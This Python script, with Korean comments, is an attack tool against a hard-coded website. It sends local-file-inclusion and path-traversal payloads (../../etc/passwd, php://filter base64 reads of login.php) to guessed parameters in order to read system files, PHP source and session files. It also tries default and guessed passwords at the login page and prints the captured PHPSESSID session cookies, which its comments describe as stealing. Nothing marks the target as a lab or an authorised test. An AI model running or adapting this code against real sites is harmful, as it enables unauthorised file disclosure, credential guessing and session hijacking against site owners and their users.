#!/usr/bin/env python3
"""
LFI/Path Traversal Scanner - PHP 세션 파일 읽기
세션 파일에서 쿠키/세션 데이터 탈취
"""

import requests
import sys
import re

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

class LFIScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })

    def test_lfi_in_params(self):
        """GET 파라미터에서 LFI 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[1] GET 파라미터 LFI 테스트{Colors.END}\n")

        # 일반적인 PHP 세션 경로들
        paths = [
            "/etc/passwd",
            "/var/www/html/index.php",
            "../../../../etc/passwd",
            "../../../../var/www/html/login.php",
            "/tmp/sess_*",
            "/var/lib/php/sessions/sess_*",
            "php://filter/convert.base64-encode/resource=login.php",
            "php://filter/read=string.rot13/resource=login.php",
        ]

        # 테스트할 파라미터들
        test_urls = [
            f"{self.base_url}/index.php?page=",
            f"{self.base_url}/profile.php?file=",
            f"{self.base_url}/view.php?id=",
        ]

        for url_base in test_urls:
            for path in paths:
                url = url_base + path
                print(f"{Colors.YELLOW}Testing:{Colors.END} {url[:80]}")

                try:
                    response = self.session.get(url, timeout=10)

                    # /etc/passwd 성공 확인
                    if 'root:' in response.text and '/bin/bash' in response.text:
                        print(f"{Colors.GREEN}✓ LFI 성공! /etc/passwd 읽기 성공{Colors.END}")
                        print(f"  {response.text[:200]}\n")
                        return True

                    # PHP 코드 노출 확인
                    elif '<?php' in response.text or 'session' in response.text.lower():
                        print(f"{Colors.GREEN}✓ 파일 읽기 성공! PHP 코드 또는 세션 데이터{Colors.END}")
                        print(f"  {response.text[:200]}\n")
                        return True

                    else:
                        print(f"{Colors.RED}✗ 실패{Colors.END}\n")

                except Exception as e:
                    print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

        return False

    def test_profile_lfi(self):
        """profile.php에서 LFI (full_name 파라미터)"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[2] profile.php LFI 테스트{Colors.END}\n")

        payloads = [
            "../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=login.php",
        ]

        for payload in payloads:
            print(f"{Colors.YELLOW}Testing:{Colors.END} {payload}")

            try:
                params = {
                    'email': 'test@test',
                    'full_name': payload
                }

                response = self.session.get(
                    f"{self.base_url}/profile.php",
                    params=params,
                    timeout=10
                )

                if 'root:' in response.text and '/bin/bash' in response.text:
                    print(f"{Colors.GREEN}✓ LFI 성공!{Colors.END}")
                    print(f"  {response.text[:200]}\n")
                    return True
                elif '<?php' in response.text:
                    print(f"{Colors.GREEN}✓ PHP 소스 코드 읽기 성공!{Colors.END}")
                    print(f"  {response.text[:200]}\n")
                    return True
                else:
                    print(f"{Colors.RED}✗ 실패{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

        return False

    def steal_session_cookie(self):
        """다른 사용자로 로그인 후 세션 쿠키 확인"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[3] 세션 쿠키 스틸링 테스트{Colors.END}\n")

        # 여러 계정으로 로그인 시도
        accounts = [
            ('alice', 'alice2024'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('test', 'test'),
        ]

        for username, password in accounts:
            print(f"{Colors.YELLOW}로그인 시도:{Colors.END} {username}/{password}")

            try:
                data = {'username': username, 'password': password}
                response = self.session.post(
                    f"{self.base_url}/login.php",
                    data=data,
                    allow_redirects=True,
                    timeout=10
                )

                cookies = self.session.cookies.get_dict()

                if cookies:
                    print(f"{Colors.GREEN}✓ 로그인 성공!{Colors.END}")
                    print(f"  Cookies: {cookies}")

                    # 세션 ID 출력
                    if 'PHPSESSID' in cookies:
                        print(f"{Colors.GREEN}  → PHPSESSID: {cookies['PHPSESSID']}{Colors.END}\n")
                    return cookies
                else:
                    print(f"{Colors.RED}✗ 실패{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

        return None

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}📂 LFI/Path Traversal Scanner{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    TARGET = "http://healthmash.net"

    print(f"{Colors.BLUE}Target: {TARGET}{Colors.END}\n")

    scanner = LFIScanner(TARGET)

    # 테스트 실행
    scanner.test_lfi_in_params()
    scanner.test_profile_lfi()
    cookies = scanner.steal_session_cookie()

    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 스캔 완료{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    if cookies:
        print(f"{Colors.GREEN}✓ 세션 쿠키 획득 성공!{Colors.END}")
        print(f"  {cookies}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 중단됨{Colors.END}")
        sys.exit(0)
